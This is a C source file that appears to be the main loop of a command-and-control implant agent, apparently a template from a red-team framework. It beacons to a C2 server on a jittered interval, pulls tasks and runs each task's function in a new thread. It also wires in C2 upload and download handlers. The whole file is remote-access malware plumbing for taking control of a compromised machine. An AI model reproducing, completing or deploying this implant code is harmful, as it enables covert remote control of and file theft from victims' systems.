#include "utils.h"
#include "errors.h"
#include "default_commands.h"
#include "time.h"
#include "unistd.h"

void* periodic_callback(){
	/* this function waits callback_interval + some jitter, then gets tasking
	 *   This is the producer thread that puts tasking into the global tasks array*/
	while(1){
		//loop forever until the main function ends
        clock_t t = clock();
        //usleep(global_info->callback_interval * 1000);
		sleep(global_info->callback_interval);

		get_tasking();
        t = clock() - t;
        double time_taken = ((double)t*10000)/CLOCKS_PER_SEC;
        printf("time to do one loop in periodic_callback with sleep of %d: %lf seconds\n", global_info->callback_interval, time_taken );
		//print_global_info();
	}
}
void* perform_tasking(){
	/* this function checks if there's a task to be done once every second
	 *   if there is one, pass it off to the correct module and function*/
	cJSON* task;
	while(1){
		sleep(1);
		task = pop_tasking();
		if(task != NULL){
			m_function *func = get_tasking_func(task);
			if (func != NULL)
			{
				//printf("found function: %s at %p\n", func->name, func->func);
				pthread_t * new_thread = (pthread_t *) malloc(sizeof(pthread_t));
				//Spin off a new thread to execute the function
                cJSON * execute_task = cJSON_Duplicate(task, cJSON_False); // this will get deleted by the calling function when it exits
				pthread_create(new_thread, NULL, (void*)func->func, execute_task);
				add_thread_to_global_info(task, new_thread);
                //printf("%s\n", get_current_jobs());
				cJSON_Delete(task);
			}
			else{
				send_basic_response("Couldn't find function to execute", cJSON_GetObjectItem(task, "id")->valueint);
			}
		}
	}
}
int initialize()
{
	if(pthread_mutex_init(&global_lock, NULL) != 0)
	{
		perror("\nglobal_lock mutex init failed\n");
		return ERR_MUTEX_INIT;
	}
	global_info = malloc(sizeof(global_JSON_info));
	if (global_info == NULL)
	{
		perror("\ncreating global_JSON_info failed\n");
		return ERR_MALLOC_SIZE;
	}
	global_info->tasking = cJSON_CreateObject();
	cJSON_AddItemToObject(global_info->tasking, "tasks", cJSON_CreateArray());
	global_info->callback_info = cJSON_CreateObject();
	global_info->callback_interval = CALLBACK_INTERVAL;
	global_info->callback_jitter = CALLBACK_JITTER;
    global_info->callback_id = -1;
	global_info->num_functions = COMMAND_COUNT_HERE;
	global_info->jobs = NULL;
	void *raw_funcs[COMMAND_COUNT_HERE] = {
	COMMAND_RAW_LIST_HERE
	};
	char *str_funcs[COMMAND_COUNT_HERE] = {
	COMMAND_STRING_LIST_HERE
	};
	global_info->functions = malloc(sizeof(m_function)*(global_info->num_functions));
	for(int i = 0; i < global_info->num_functions; i++){
        global_info->functions[i].name = str_funcs[i];
        global_info->functions[i].func = raw_funcs[i];
	}
	global_info->C2.initial_callback = initial_callback;
	global_info->C2.get_tasking = get_tasking;
	global_info->C2.post_response = post_response;
	global_info->C2.upload = c2_upload;
	global_info->C2.download = c2_download;
	return SUCCESS;
}
int main(){
	pthread_t periodic_callback_thread, perform_tasking_thread;
	initialize();
	initial_callback();
	pthread_create(&periodic_callback_thread, NULL, periodic_callback, NULL);
	pthread_create(&perform_tasking_thread, NULL, perform_tasking, NULL);
	pthread_join(periodic_callback_thread, NULL);
	//while(1);
}
